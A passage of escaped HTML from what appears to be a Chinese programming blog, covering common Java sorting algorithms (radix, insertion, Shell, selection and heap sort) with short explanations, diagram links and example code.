class=\"line\">            }     </span><br><span class=\"line\">                int count=0;//&#x5143;&#x7D20;&#x8BA1;&#x6570;&#x5668;;     </span><br><span class=\"line\">            //&#x6536;&#x96C6;&#x961F;&#x5217;&#x5143;&#x7D20;;     </span><br><span class=\"line\">                <span class=\"keyword\">for</span>(int k=0;k&lt;10;k++){   </span><br><span class=\"line\">                <span class=\"keyword\">while</span>(queue.get(k).size()&gt;0){  </span><br><span class=\"line\">                    ArrayList&lt;Integer&gt; queue3=queue.get(k);  </span><br><span class=\"line\">                        array[count]=queue3.get(0);     </span><br><span class=\"line\">                        queue3.remove(0);  </span><br><span class=\"line\">                    count++;  </span><br><span class=\"line\">              }     </span><br><span class=\"line\">            }     </span><br><span class=\"line\">          }     </span><br><span class=\"line\"></span><br><span class=\"line\">   }    </span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<h3 id=\"&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;\"><a href=\"#&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;\" class=\"headerlink\" title=\"&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;:\"></a>&#x5E38;&#x89C1;&#x6392;&#x5E8F;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;:</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/1.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/2.png\" alt=\"\"></p>","more":"<h3 id=\"1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;\"><a href=\"#1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;\"></a>1&#x3001;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x5047;&#x8BBE;&#x524D;&#x9762;(n-1)[n&gt;=2] &#x4E2A;&#x6570;&#x5DF2;&#x7ECF;&#x662F;&#x6392;<br>&#x597D;&#x987A;&#x5E8F;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x8981;&#x628A;&#x7B2C;n&#x4E2A;&#x6570;&#x63D2;&#x5230;&#x524D;&#x9762;&#x7684;&#x6709;&#x5E8F;&#x6570;&#x4E2D;&#xFF0C;&#x4F7F;&#x5F97;&#x8FD9;n&#x4E2A;&#x6570;<br>&#x4E5F;&#x662F;&#x6392;&#x597D;&#x987A;&#x5E8F;&#x7684;&#x3002;&#x5982;&#x6B64;&#x53CD;&#x590D;&#x5FAA;&#x73AF;&#xFF0C;&#x76F4;&#x5230;&#x5168;&#x90E8;&#x6392;&#x597D;&#x987A;&#x5E8F;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/3.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> package com.njue;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class insertSort {  </span><br><span class=\"line\">public <span class=\"function\"><span class=\"title\">insertSort</span></span>(){  </span><br><span class=\"line\">    inta[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">    int temp=0;  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=1;i&lt;a.length;i++){  </span><br><span class=\"line\">       int j=i-1;  </span><br><span class=\"line\">       temp=a[i];  </span><br><span class=\"line\">       <span class=\"keyword\">for</span>(;j&gt;=0&amp;&amp;temp&lt;a[j];j--){  </span><br><span class=\"line\">       a[j+1]=a[j];                       //&#x5C06;&#x5927;&#x4E8E;temp&#x7684;&#x503C;&#x6574;&#x4F53;&#x540E;&#x79FB;&#x4E00;&#x4E2A;&#x5355;&#x4F4D;  </span><br><span class=\"line\">       }  </span><br><span class=\"line\">       a[j+1]=temp;  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">       System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;\"><a href=\"#2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;\" class=\"headerlink\" title=\"2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;\"></a>2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x7B97;&#x6CD5;&#x5148;&#x5C06;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x6309;&#x67D0;&#x4E2A;&#x589E;&#x91CF;d&#xFF08;n/2,n&#x4E3A;&#x8981;&#x6392;&#x5E8F;&#x6570;&#x7684;&#x4E2A;&#x6570;&#xFF09;&#x5206;&#x6210;&#x82E5;&#x5E72;&#x7EC4;&#xFF0C;&#x6BCF;&#x7EC4;&#x4E2D;&#x8BB0;&#x5F55;&#x7684;&#x4E0B;&#x6807;&#x76F8;&#x5DEE;d.&#x5BF9;&#x6BCF;&#x7EC4;&#x4E2D;&#x5168;&#x90E8;&#x5143;&#x7D20;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x7528;&#x4E00;&#x4E2A;&#x8F83;&#x5C0F;&#x7684;&#x589E;&#x91CF;&#xFF08;d/2&#xFF09;&#x5BF9;&#x5B83;&#x8FDB;&#x884C;&#x5206;&#x7EC4;&#xFF0C;&#x5728;&#x6BCF;&#x7EC4;&#x4E2D;&#x518D;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x3002;&#x5F53;&#x589E;&#x91CF;&#x51CF;&#x5230;1&#x65F6;&#xFF0C;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x540E;&#xFF0C;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/4.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class shellSort {  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">shellSort</span></span>(){  </span><br><span class=\"line\">    int a[]={1,54,6,3,78,34,12,45,56,100};  </span><br><span class=\"line\">    double d1=a.length;  </span><br><span class=\"line\">    int temp=0;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){  </span><br><span class=\"line\">        d1= Math.ceil(d1/2);  </span><br><span class=\"line\">        int d=(int) d1;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int x=0;x&lt;d;x++){  </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int i=x+d;i&lt;a.length;i+=d){  </span><br><span class=\"line\">                int j=i<span class=\"_\">-d</span>;  </span><br><span class=\"line\">                temp=a[i];  </span><br><span class=\"line\">                <span class=\"keyword\">for</span>(;j&gt;=0&amp;&amp;temp&lt;a[j];j-=d){  </span><br><span class=\"line\">                a[j+d]=a[j];  </span><br><span class=\"line\">                }  </span><br><span class=\"line\">                a[j+d]=temp;  </span><br><span class=\"line\">            }  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(d==1)  </span><br><span class=\"line\">            <span class=\"built_in\">break</span>;  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;\"><a href=\"#3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;\"></a>3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x9009;&#x51FA;&#x6700;&#x5C0F;&#x7684;&#x4E00;&#x4E2A;&#x6570;&#x4E0E;&#x7B2C;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x4EA4;&#x6362;&#xFF1B;<br>&#x7136;&#x540E;&#x5728;&#x5269;&#x4E0B;&#x7684;&#x6570;&#x5F53;&#x4E2D;&#x518D;&#x627E;&#x6700;&#x5C0F;&#x7684;&#x4E0E;&#x7B2C;&#x4E8C;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x4EA4;&#x6362;&#xFF0C;&#x5982;&#x6B64;&#x5FAA;&#x73AF;&#x5230;&#x5012;&#x6570;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x548C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6570;&#x6BD4;&#x8F83;&#x4E3A;&#x6B62;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/5.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class selectSort {  </span><br><span class=\"line\">    public <span class=\"function\"><span class=\"title\">selectSort</span></span>(){  </span><br><span class=\"line\">        int a[]={1,54,6,3,78,34,12,45};  </span><br><span class=\"line\">        int position=0;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++){  </span><br><span class=\"line\"></span><br><span class=\"line\">            int j=i+1;  </span><br><span class=\"line\">            position=i;  </span><br><span class=\"line\">            int temp=a[i];  </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(;j&lt;a.length;j++){  </span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[j]&lt;temp){  </span><br><span class=\"line\">                temp=a[j];  </span><br><span class=\"line\">                position=j;  </span><br><span class=\"line\">            }  </span><br><span class=\"line\">            }  </span><br><span class=\"line\">            a[position]=a[i];  </span><br><span class=\"line\">            a[i]=temp;  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">            System.out.println(a[i]);  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"4&#x3001;&#x5806;&#x6392;&#x5E8F;\"><a href=\"#4&#x3001;&#x5806;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"4&#x3001;&#x5806;&#x6392;&#x5E8F;\"></a>4&#x3001;&#x5806;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5806;&#x6392;&#x5E8F;&#x662F;&#x4E00;&#x79CD;&#x6811;&#x5F62;&#x9009;&#x62E9;&#x6392;&#x5E8F;&#xFF0C;&#x662F;&#x5BF9;&#x76F4;&#x63A5;&#x9009;&#x62E9;&#x6392;&#x5E8F;&#x7684;&#x6709;&#x6548;&#x6539;&#x8FDB;&#x3002;<br>&#x5806;&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;&#x5177;&#x6709;n&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x5E8F;&#x5217;&#xFF08;h1,h2,&#x2026;,hn),&#x5F53;&#x4E14;&#x4EC5;&#x5F53;&#x6EE1;&#x8DB3;&#xFF08;hi&gt;=h2i,hi&gt;=2i+1&#xFF09;&#x6216;&#xFF08;hi&lt;=h2i,hi&lt;=2i+1&#xFF09; (i=1,2,&#x2026;,n/2)&#x65F6;&#x79F0;&#x4E4B;&#x4E3A;&#x5806;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#x53EA;&#x8BA8;&#x8BBA;&#x6EE1;&#x8DB3;&#x524D;&#x8005;&#x6761;&#x4EF6;&#x7684;&#x5806;&#x3002;&#x7531;&#x5806;&#x7684;&#x5B9A;&#x4E49;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5806;&#x9876;&#x5143;&#x7D20;&#xFF08;&#x5373;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF09;&#x5FC5;&#x4E3A;&#x6700;&#x5927;&#x9879;&#xFF08;&#x5927;&#x9876;&#x5806;&#xFF09;&#x3002;&#x5B8C;&#x5168;&#x4E8C;&#x53C9;&#x6811;&#x53EF;&#x4EE5;&#x5F88;&#x76F4;&#x89C2;&#x5730;&#x8868;&#x793A;&#x5806;&#x7684;&#x7ED3;&#x6784;&#x3002;&#x5806;&#x9876;&#x4E3A;&#x6839;&#xFF0C;&#x5176;&#x5B83;&#x4E3A;&#x5DE6;&#x5B50;&#x6811;&#x3001;&#x53F3;&#x5B50;&#x6811;&#x3002;&#x521D;&#x59CB;&#x65F6;&#x628A;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x6570;&#x7684;&#x5E8F;&#x5217;&#x770B;&#x4F5C;&#x662F;&#x4E00;&#x68F5;&#x987A;&#x5E8F;&#x5B58;&#x50A8;&#x7684;&#x4E8C;&#x53C9;&#x6811;&#xFF0C;&#x8C03;&#x6574;&#x5B83;&#x4EEC;&#x7684;&#x5B58;&#x50A8;&#x5E8F;&#xFF0C;&#x4F7F;&#x4E4B;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5806;&#xFF0C;&#x8FD9;&#x65F6;&#x5806;&#x7684;&#x6839;&#x8282;&#x70B9;&#x7684;&#x6570;&#x6700;&#x5927;&#x3002;&#x7136;&#x540E;&#x5C06;&#x6839;&#x8282;&#x70B9;&#x4E0E;&#x5806;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x4EA4;&#x6362;&#x3002;&#x7136;&#x540E;&#x5BF9;&#x524D;&#x9762;(n-1)&#x4E2A;&#x6570;&#x91CD;&#x65B0;&#x8C03;&#x6574;&#x4F7F;&#x4E4B;&#x6210;&#x4E3A;&#x5806;&#x3002;&#x4F9D;&#x6B64;&#x7C7B;&#x63A8;&#xFF0C;&#x76F4;&#x5230;&#x53EA;&#x6709;&#x4E24;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x5806;&#xFF0C;&#x5E76;&#x5BF9;&#x5B83;&#x4EEC;&#x4F5C;&#x4EA4;&#x6362;&#xFF0C;&#x6700;&#x540E;&#x5F97;&#x5230;&#x6709;n&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;&#x4ECE;&#x7B97;&#x6CD5;&#x63CF;&#x8FF0;&#x6765;&#x770B;&#xFF0C;&#x5806;&#x6392;&#x5E8F;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E00;&#x662F;&#x5EFA;&#x7ACB;&#x5806;&#xFF0C;&#x4E8C;&#x662F;&#x5806;&#x9876;&#x4E0E;&#x5806;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x4EA4;&#x6362;&#x4F4D;&#x7F6E;&#x3002;&#x6240;&#x4EE5;&#x5806;&#x6392;&#x5E8F;&#x6709;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7EC4;&#x6210;&#x3002;&#x4E00;&#x662F;&#x5EFA;&#x5806;&#x7684;&#x6E17;&#x900F;&#x51FD;&#x6570;&#xFF0C;&#x4E8C;&#x662F;&#x53CD;&#x590D;&#x8C03;&#x7528;&#x6E17;&#x900F;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x6392;&#x5E8F;&#x7684;&#x51FD;&#x6570;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br>&#x521D;&#x59CB;&#x5E8F;&#x5217;&#xFF1A;46,79,56,38,40,84<br>&#x5EFA;&#x5806;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/6.png\" alt=\"\"><br>&#x4EA4;&#x6362;&#xFF0C;&#x4ECE;&#x5806;&#x4E2D;&#x8E22;&#x51FA;&#x6700;&#x5927;&#x6570;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/7.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/8.png\" alt=\"\"><br>&#x4F9D;&#x6B21;&#x7C7B;&#x63A8;&#xFF1A;&#x6700;&#x540E;&#x5806;&#x4E2D;&#x5269;&#x4F59;&#x7684;&#x6700;&#x540E;&#x4E24;&#x4E2A;&#x7ED3;&#x70B9;&#x4EA4;&#x6362;&#xFF0C;&#x8E22;&#x51FA;&#x4E00;&#x4E2A;&#xFF0C;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x3002;<br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.Arrays;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class HeapSort {  </span><br><span class=\"line\">     int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">    public  <span class=\"function\"><span class=\"title\">HeapSort</span></span>(){  </span><br><span class=\"line\">        heapSort(a);  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    public  void heapSort(int[] a){  </span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;&#x5F00;&#x59CB;&#x6392;&#x5E8F;&quot;</span>);  </span><br><span class=\"line\">        int arrayLength=a.length;  </span><br><span class=\"line\">        //&#x5FAA;&#x73AF;&#x5EFA;&#x5806;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=0;i&lt;arrayLength-1;i++){  </span><br><span class=\"line\">            //&#x5EFA;&#x5806;  </span><br><span class=\"line\"></span><br><span class=\"line\">      buildMaxHeap(a,arrayLength-1-i);  </span><br><span class=\"line\">            //&#x4EA4;&#x6362;&#x5806;&#x9876;&#x548C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;  </span><br><span class=\"line\">            swap(a,0,arrayLength-1-i);  </span><br><span class=\"line\">            System.out.println(Arrays.toString(a));  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">    }  </span><br><span class=\"line\"></span><br><span class=\"line\">    private  void swap(int[] data, int i, int j) {  </span><br><span class=\"line\">        // TODO Auto-generated method stub  </span><br><span class=\"line\">        int tmp=data[i];  </span><br><span class=\"line\">        data[i]=data[j];  </span><br><span class=\"line\">        data[j]=tmp;  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    //&#x5BF9;data&#x6570;&#x7EC4;&#x4ECE;0&#x5230;lastIndex&#x5EFA;&#x5927;&#x9876;&#x5806;  </span><br><span class=\"line\">    private void buildMaxHeap(int[] data, int lastIndex) {  </span><br><span class=\"line\">        // TODO Auto-generated method stub  </span><br><span class=\"line\">        //&#x4ECE;lastIndex&#x5904;&#x8282;&#x70B9;&#xFF08;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF09;&#x7684;&#x7236;&#x8282;&#x70B9;&#x5F00;&#x59CB;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=(lastIndex-1)/2;i&gt;=0;i--){  </span><br><span class=\"line\">            //k&#x4FDD;&#x5B58;&#x6B63;&#x5728;&#x5224;&#x65AD;&#x7684;&#x8282;&#x70B9;  </span><br><span class=\"line\">            int k=i;  </span><br><span class=\"line\">            //&#x5982;&#x679C;&#x5F53;&#x524D;k&#x8282;&#x70B9;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x5B58;&#x5728;  </span><br><span class=\"line\">            <span class=\"keyword\">while</span>(k*2+1&lt;=lastIndex){  </span><br><span class=\"line\">                //k&#x8282;&#x70B9;&#x7684;&#x5DE6;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x7D22;&#x5F15;  </span><br><span class=\"line\">                int biggerIndex=2*k+1;  </span><br><span class=\"line\">                //&#x5982;&#x679C;biggerIndex&#x5C0F;&#x4E8E;lastIndex&#xFF0C;&#x5373;biggerIndex+1&#x4EE3;&#x8868;&#x7684;k&#x8282;&#x70B9;&#x7684;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x5B58;&#x5728;  </span><br><span class=\"line\">                <span class=\"keyword\">if</span>(biggerIndex&lt;lastIndex){  </span><br><span class=\"line\">                    //&#x82E5;&#x679C;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C;&#x8F83;&#x5927;  </span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(data[biggerIndex]&lt;data[biggerIndex+1]){  </span><br><span class=\"line\">                        //biggerIndex&#x603B;&#x662F;&#x8BB0;&#x5F55;&#x8F83;&#x5927;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x7D22;&#x5F15;  </span><br><span class=\"line\">                        biggerIndex++;  </span><br><span class=\"line\">                    }  </span><br><span class=\"line\">                }  </span><br><span class=\"line\">                //&#x5982;&#x679C;k&#x8282;&#x70B9;&#x7684;&#x503C;&#x5C0F;&#x4E8E;&#x5176;&#x8F83;&#x5927;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C;  </span><br><span class=\"line\">                <span class=\"keyword\">if</span>(data[k]&lt;data[biggerIndex]){  </span><br><span class=\"line\">                    //&#x4EA4;&#x6362;&#x4ED6;&#x4EEC;  </span><br><span class=\"line\">                    swap(data,k,biggerIndex);  </span><br><span class=\"line\">                    //&#x5C06;biggerIndex&#x8D4B;&#x4E88;k&#xFF0C;&#x5F00;&#x59CB;<span class=\"keyword\">while</span>&#x5FAA;&#x73AF;&#x7684;&#x4E0B;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x91CD;&#x65B0;&#x4FDD;&#x8BC1;k&#x8282;&#x70B9;&#x7684;&#x503C;&#x5927;&#x4E8E;&#x5176;&#x5DE6;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C;  </span><br><span class=\"line\">                    k=biggerIndex;  </span><br><span class=\"line\">                }<span class=\"keyword\">else</span>{  </span><br><span class=\"line\">                    <span class=\"built_in\">break</span>;  </span><br><span class=\"line\">                }  </span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;\"><a href=\"#5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;\" class=\"headerlink\" 